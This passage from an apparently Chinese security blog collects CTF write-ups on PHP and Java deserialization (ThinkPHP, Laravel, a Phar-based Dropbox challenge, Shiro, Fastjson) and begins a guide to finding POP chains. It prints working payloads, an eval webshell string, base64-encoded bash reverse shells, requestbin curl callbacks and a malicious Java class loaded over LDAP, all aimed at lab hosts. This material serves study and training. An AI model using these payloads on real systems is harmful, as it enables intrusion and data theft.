class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [<span class="string">'getError'</span>];</span><br><span class="line">    <span class="keyword">protected</span> $error = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error=<span class="keyword">new</span> HasOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Windows类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$x=<span class="keyword">new</span> Windows();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($x));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(iconv(<span class="string">"UCS-2BE"</span>, <span class="string">"UCS-2LE"</span>, <span class="string">'&lt;?php eval($_POST[x]);?&gt;'</span>));</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-总决赛-Day1-Web4-Laravel1-1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1-1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a><strong>[CISCN2019 总决赛 Day1 Web4]Laravel1</strong></h3><p>题目转载：<a href="https://my.oschina.net/u/4258824/blog/3398614" target="_blank" rel="noopener">https://my.oschina.net/u/4258824/blog/3398614</a></p><ol><li>首先全局搜索__destruct这样的魔术方法</li><li>看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类</li><li>然后全局搜索能利用的可控函数</li></ol><p>题目：<a href="http://10.20.25.44:581/" target="_blank" rel="noopener">http://10.20.25.44:581/</a> laravel，构造 rop 拿到 /flag 内容</p><p><img src="http://qiniuyun.lintstar.top/20200806163533.png" alt="20200806163533"></p><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>; <span class="comment">//这里是要访问的目录/etc/passwd</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'aaa'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $obj = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意这里GET的参数是payload<br>payload</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.25.44:581/?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22aaa%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200806163340.png" alt="20200806163340"></p><h3 id="Phar-触发反序列化"><a href="#Phar-触发反序列化" class="headerlink" title="Phar 触发反序列化"></a>Phar 触发反序列化</h3><p><strong>BUUCTF 上 Web 分类的 [CISCN2019 华北赛区 Day1 Web1]Dropbox</strong></p><p><strong>本题主要考察目录穿越读取源码以及 使用 phar 触发 php 反序列化。</strong></p><p>打开是这样一个靶机。</p><p><img src="http://qiniuyun.lintstar.top/20200810224150.png" alt="20200810224150"></p><p>注册之后登录，是个网盘系统，可以上传下载 png 等图片文件。</p><p><img src="http://qiniuyun.lintstar.top/20200810224233.png" alt="20200810224233"></p><p>抓包看看下载的包，看到里面传入文件名给 /download.php 进行下载。</p><p><img src="http://qiniuyun.lintstar.top/20200810224310.png" alt="20200810224310"></p><p>尝试篡改 filename  这个参数进行路径穿越，可以路径穿越下载到网站源码。</p><p><img src="http://qiniuyun.lintstar.top/20200810224449.png" alt="20200810224449"></p><p>抓包分析网站上各种请求的url，分别得到有如下的路径。</p><ul><li><strong>/index.php</strong>   网站首页</li><li><strong>/download.php</strong>   下载文件</li><li><strong>/login.php</strong> 登录请求</li><li><strong>/upload.php</strong> 上传文件</li><li><strong>/class.php</strong> 类定义文件，通过查看 upload.php 得到</li><li><strong>/delete.php</strong> 删除文件</li></ul><p>通过路径穿越把他们都下载下来，在本地用 phpstorm  创建一个项目查看。</p><p><img src="http://qiniuyun.lintstar.top/20200810224645.png" alt="20200810224645"></p><p>看到这个 class.php，里面有三个类 User, FileList，File。</p><p><img src="http://qiniuyun.lintstar.top/20200810224659.png" alt="20200810224659"></p><p>看到里面有两个类有高危的魔术方法 <strong>__destruct</strong>。FileList 的 __destruct 无法利用，因为里面只是单纯的做了一个输出，对我们来说意义并不大。</p><p><img src="http://qiniuyun.lintstar.top/20200810224716.png" alt="20200810224716"></p><p>然后看到 User 的 __destruct，里面有调用 db 属性的 close 方法。</p><p><img src="http://qiniuyun.lintstar.top/20200810224734.png" alt="20200810224734"></p><p>看看程序中有哪个类有定义 close。</p><p><img src="http://qiniuyun.lintstar.top/20200810224748.png" alt="20200810224748"></p><p>File 类中有定义，但其只是做了一个调用没有输出。所以我们还要想个办法进行输出。</p><p>同时看到在 FileList 中看到有定义 <strong>__call</strong> ，则代表其所有没被定义的方法被调用时都会调用这个魔术方法。</p><p>看到这个魔术方法被调用之后会挨个调用 files 中的对象的相应同名方法，并把结果存储到结果中。</p><p><img src="http://qiniuyun.lintstar.top/20200810224840.png" alt="20200810224840"></p><p>同时 FileList 又有析构方法，其在对象被销毁时会被调用。在其中对结果数组做了输出。</p><p><img src="http://qiniuyun.lintstar.top/20200810224910.png" alt="20200810224910"></p><p>所以我们的反序列链条就出来了。首先定义一个 <strong>User</strong> 类对象，让其中的 db 为 FileList 类对象，<strong>User被销毁时</strong>会去调用 db 的 <strong>close</strong> 方法。调用到 FileList 的 close 之后由于其没有定义 close 方法，则会调用到 <strong>__call</strong> 魔术方法，这里调用之后就会调用 files 中 file 所指代的对象的同名方法，file 这里我们让他<strong>指向 File 类的类对象</strong>，触发其中的 close 返回文件内容。，调用完成之后把结果存上。最后在 FileList 对象<strong>被销毁的时候</strong>就会输出这些结果。</p><p>链条有了，我们的反序列化点在哪呢？<br>直接搜索 <strong>unserialize</strong> 并没有搜到，所以我们需要用<strong>文件操作 + phar</strong> 的方式触发反序列化。</p><p>看到 download.php 里有限制 <strong>open_basedir</strong>，这里我们没法利用来读取根目录下的 flag 文件。</p><p><img src="http://qiniuyun.lintstar.top/20200810225026.png" alt="20200810225026"></p><p>看到 delete 里没有限制，所以这里这个文件操作点我们可以利用，在这里<strong>将 filename 传入 phar 伪协议</strong>来触发反序列化。</p><p><img src="http://qiniuyun.lintstar.top/20200810225154.png" alt="20200810225154"></p><p>构造 phar 文件的程序如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * User constructor.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $funcs=<span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * FileList constructor.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"/flag.txt"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"aaaa"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>39 行的 “GIF89a” 则是为了<strong>给上次的文件添加文件头绕过检测。</strong></p><p>构造完成之后，把生成的 phar 文件的扩展名改成 gif 再上传。</p><p><img src="http://qiniuyun.lintstar.top/20200810225314.png" alt="20200810225314"></p><p>最后抓删除文件的包，将文件名参数改为 phar 伪协议，触发反序列化，读到 flag。</p><p><img src="http://qiniuyun.lintstar.top/20200810225330.png" alt="20200810225330"></p><h2 id="Java-反序列化漏洞"><a href="#Java-反序列化漏洞" class="headerlink" title="Java 反序列化漏洞"></a>Java 反序列化漏洞</h2><h3 id="Java反序列化—Shiro相关工具使用和探究"><a href="#Java反序列化—Shiro相关工具使用和探究" class="headerlink" title="Java反序列化—Shiro相关工具使用和探究"></a>Java反序列化—Shiro相关工具使用和探究</h3><p>给到的是 Shiro 1.2.4 的一个靶机: <code>http://10.20.25.44:780/login</code></p><p>打开网站，看到是一个登录界面。</p><p><img src="http://qiniuyun.lintstar.top/20200810231703.png" alt="20200810231703"></p><p>这里有提示这个网站是有用到 shiro 组件的，所以可以利用网上的工具来直接试试。</p><blockquote><p><strong>搜工具首选 GitHub</strong></p></blockquote><p>这里搜索到 ShiroScan这个工具，可以尝试利用他来攻击一下这个网站试试</p><p><strong><a href="https://github.com/sv3nbeast/ShiroScan" target="_blank" rel="noopener">https://github.com/sv3nbeast/ShiroScan</a></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro_rce.py <span class="string">'http://10.20.25.44:780/'</span> <span class="string">'curl http://http.requestbin.buuoj.cn/y0u7dvy0'</span></span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200810231924.png" alt="20200810231924"></p><p>然后就可以接收到请求，说明命令成功执行了：</p><p><img src="http://qiniuyun.lintstar.top/20200810232021.png" alt="20200810232021"></p><p>然后接下来反弹一个 shell 试试，你会发现直接用管道符命令来反弹 shell并不行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro_rce.py <span class="string">'http://10.20.25.44:780/'</span> <span class="string">'bash -i &gt;&amp; /dev/tcp/10.11.33.142/8888 0&gt;&amp;1'</span></span><br></pre></td></tr></table></figure><p>因为 java 中 <strong>Runtime.getRuntime().exec()</strong> 中执行命令并不是直接调用 sh，而是自己尝试解析命令然后执行，如果我们插入某些符号则<strong>会扰乱判断</strong>，造成命令失败。</p><p>那还有什么方式来利用管道符反弹 shell 呢？</p><p>所以先尝试把命令编码成 base64，然后在这里执行命令的时候先 base64 解码然后再执行，是不是就可以绕过上面的符号扰乱呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro_rce.py <span class="string">'http://10.20.25.44:780/'</span> <span class="string">'bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjIwLjI0LjI0MS84ODg4IDA+JjEK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span></span><br></pre></td></tr></table></figure><p>这里就是解码然后执行。</p><p>然后反弹 shell 成功，拿到 flag。</p><p><img src="http://qiniuyun.lintstar.top/20200810232359.png" alt="20200810232359"></p><h3 id="Java-反序列化—Fastjson-相关Payload使用和探究"><a href="#Java-反序列化—Fastjson-相关Payload使用和探究" class="headerlink" title="Java 反序列化—Fastjson 相关Payload使用和探究"></a>Java 反序列化—Fastjson 相关Payload使用和探究</h3><p>首先给到靶机地址， <code>http://10.20.25.44:781/test/test</code>，打开 405 请求方式不允许，则尝试POST 上去，又提示媒体类型不存在</p><p><img src="http://qiniuyun.lintstar.top/20200810232553.png" alt="20200810232553"></p><p><strong>fuzz 一下 content-type 发现json 可以。</strong></p><p><img src="http://qiniuyun.lintstar.top/20200810232724.png" alt="20200810232724"></p><p>知道是 fastjson 了，想到用 fastjson 的相关 payload 打一打，而 <strong>fastjson 最重要的点就是它的 autoType</strong>，所以在这里尝试用 autoType 的 payload 打一打看看。</p><p><a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">https://paper.seebug.org/1192/</a></p><p>如何测试这些 payload 呢？看一下只要这些 payload 能不能发送数据到你自己这儿就可以判断了。比如这个 payload。</p><p><img src="http://qiniuyun.lintstar.top/20200810232918.png" alt="20200810232918"></p><p>他要是能用，那是不是就能发送数据到这个地址上面呢？</p><p>我们一个个来试试，试到这个可以：</p><p><a href="https://paper.seebug.org/1192/#ver1225ver1241" target="_blank" rel="noopener">https://paper.seebug.org/1192/#ver1225ver1241</a></p><p><img src="http://qiniuyun.lintstar.top/20200810232953.png" alt="20200810232953"></p><p>使用 nc 开启 1389端口的监听：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv <span class="number">1389</span></span><br></pre></td></tr></table></figure><p><strong>然后在本地启动一个恶意的 ldap服务器进行攻击。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//10.20.24.241:8887/#Exploit</span></span><br></pre></td></tr></table></figure><p>下载 <code>10.20.24.241:8887</code> 上的恶意类 Exploit，下载 <strong>Exploit.class</strong>。</p><p><img src="http://qiniuyun.lintstar.top/20200810233142.png" alt="20200810233142"></p><p>来构造一下恶意类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Runtime.getRuntime().exec("calc");</span></span><br><span class="line">            java.lang.Runtime.getRuntime().exec(</span><br><span class="line">                    <span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"curl http://http.requestbin.buuoj.cn/18jehhb1"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>javac 编译一下。注意需要使用 JDK8。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure><p>然后还需要在本地启动一个 web 服务器监听 8887 端口来发送恶意类。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">8887</span> -t ./</span><br></pre></td></tr></table></figure><p>最后发送 payload，触发 <strong>靶机 -&gt; 本地 ldap -&gt; 本地恶意类</strong> 的读取，从而执行恶意类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"rand1"</span>: &#123;</span><br><span class="line">    <span class="string">"@type"</span>: <span class="string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span>,</span><br><span class="line">    <span class="string">"dataSourceName"</span>: <span class="string">"ldap://10.20.24.241:1389/Object"</span>,</span><br><span class="line">    <span class="string">"autoCommit"</span>: <span class="keyword">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200810233352.png" alt="20200810233352"></p><p>可以看到成功执行 curl，请求到我们的 requestbin 上面。</p><p><img src="http://qiniuyun.lintstar.top/20200810233405.png" alt="20200810233405"></p><p>反弹 shell 也同理:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Runtime.getRuntime().exec("calc");</span></span><br><span class="line">            java.lang.Runtime.getRuntime().exec(</span><br><span class="line">                    <span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>,<span class="string">"-c"</span>,<span class="string">"&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjIwLjI0LjI0MS84ODg4IDA+JjEK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200810233444.png" alt="20200810233444"></p><blockquote><p><strong>以上整理自 <a href="https://zhaoj.in/" target="_blank" rel="noopener">赵今</a> 师傅的 WriteUp 特此鸣谢</strong></p></blockquote><h1 id="如何挖掘自己的php反序列化链"><a href="#如何挖掘自己的php反序列化链" class="headerlink" title="如何挖掘自己的php反序列化链"></a>如何挖掘自己的php反序列化链</h1><p><strong>转载自：<a href="https://xz.aliyun.com/t/8082" target="_blank" rel="noopener">https://xz.aliyun.com/t/8082</a></strong></p><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>在使用<strong>php的反序列化漏洞</strong>前需要两个条件</p><ul><li>可以进行反序列化的点</li><li>合理的 <strong>pop chain</strong> 这一对组合拳形成的反序列化漏洞可以进而造成 <strong>RCE、文件读写、信息泄露</strong>等危害</li></ul><h2 id="总则"><a href="#总则" class="headerlink" title="总则"></a>总则</h2><p>挖链的途中总结出以下两点：</p><p><strong>1. 变量可控</strong></p><blockquote><p><strong>在危险的函数和结构上的可控变量要尽可能的多</strong></p></blockquote><p><strong>2. 扩大影响</strong></p><blockquote><p><strong>尽可能的去寻找可以扩大攻击面的结构与方法</strong></p></blockquote><p><strong>接下来的pop chain构造便一直基于这两点</strong></p><h2 id="寻找起点"><a href="#寻找起点" class="headerlink" title="寻找起点"></a>寻找起点</h2><p><strong>序列化是将对象的属性进行格式的转换，但不会包括方法。所以如果想要反序列化达成恶意的操作必须需要方法的执行。</strong></p><blockquote><p><strong>对于起点来说，要找到可以自动调用的方法。常见的可以自动调用的方法便是魔术方法。</strong></p></blockquote><p>目前只有两个魔术方法可以被使用</p><p><strong>1. __destruct</strong><br><strong>2. __wakeup</strong></p><p>其中，最为常用的魔术方法是 <strong>__destruct</strong>，其特性是<strong>对象被销毁前被调用</strong>。从系统结构的角度讲，其最常见的场景是关闭某些功能。比如关闭文件流，更新数据等。但从反序列化的角度讲，其特殊的使用场景，代表在这个方法内可能会调用类内的其它方法。</p><p>而另一个 <strong>__wakeup</strong>方法就不太常用了，其特性是<strong>反序列化时进行调用</strong>。那么可以想象开发人员在对其进行编写时，可能会将其作为一个<strong>进行反序列化时属性合法性校验的方法。</strong></p><p>最经典的就是 <strong>GuzzleHttp</strong> 包中的 <strong>GuzzleHttp \ Psr7 \ FnStream</strong> 类，其内部存在<strong>大量变量可控的危险函数</strong>。但以下这一个方法就直接避免了这个方法被恶意使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \LogicException(<span class="string">'FnStream should never be unserialized'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然也不是没有使用了 <strong>__wakeup</strong>的链，只不过从各个方面来讲，<strong>__destruct</strong> 确实更好用一些。</p><p>接下来再看一个例子。</p><p><strong>phpggc</strong> 是github上的一个项目，其存储着大量反序列化链，可以说是<strong>反序列化的武器库。</strong></p><p>其存储了大量的 <strong>laravel 框架的 RCE反序列化链</strong>，仔细观察发现一共6条反序列化链，5条都使用了同一个类作为起点，还有一条也间接调用了此类。其便是<strong>PendingBroadcast.php</strong>下的 <strong>__destruct</strong>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个特点：</p><p><strong>1. 可自动调用</strong><br><strong>2. 参数可控</strong><br><strong>3. 攻击面广</strong></p><p>自动调用自然不必多说，<strong>__destruct</strong>方法嘛。但值得注意的是其<strong>参数和结构</strong>。</p><p>我们可以看到<code>$this-&gt;events</code>和<code>$this-&gt;event</code>都是可控的，这意味着我们的链可以有两条走向。</p><blockquote><p><strong>其一是将 $this-&gt;events 赋值为没有 dispatch 方法的实例，来调用其 __call方法。</strong><br><strong>其二是去调用各种类中 dispatch 方法，如果有的 dispatch 中有危险的函数或者结构，那就考虑使用它。</strong></p></blockquote><p><strong>这样就大幅扩大了我们的攻击面。</strong></p><h2 id="跳板挑选"><a href="#跳板挑选" class="headerlink" title="跳板挑选"></a>跳板挑选</h2><blockquote><p><strong>所谓的跳板，就是在方法和方法、结构和结构、方法和结构之间的跳跃。</strong></p></blockquote><p>常见的例子是一些<strong>字符串函数</strong>，例如 <strong>trim</strong>，如果其参数可控，我们将其赋值为存在 <strong>__toString</strong>方法的对象即可调用这个方法。</p><p>还有类似于 <code>call_user_func($this-&gt;test);</code> 或者 <code>$test();</code> 这种只能调用没有参数的函数的结构。出来简单的调用 phpinfo 以外，我们也可以考虑将变量赋值为<code>[(new test), &quot;aaa&quot;]</code>这样的一个数组。就可以调用test类中的aaa公共方法。</p><p>再者，就是 <code>new $test1($test2, $test3);</code> 这样的结构也可以调用 <strong>__construct</strong>方法。或者像 RCTF2020-swoole 一题一样，新建一个PDO对象来进行mysql的load file。</p><blockquote><p><strong>总之，就是不计一切代价扩大链的可能性，为寻找到可以利用的方法提供机会。</strong></p></blockquote><h2 id="终点"><a href="#终点" class="headerlink" title="终点"></a>终点</h2><p><strong>终点在我看来有两类</strong></p><p><strong>1. 危险动态调用</strong><br><strong>2. 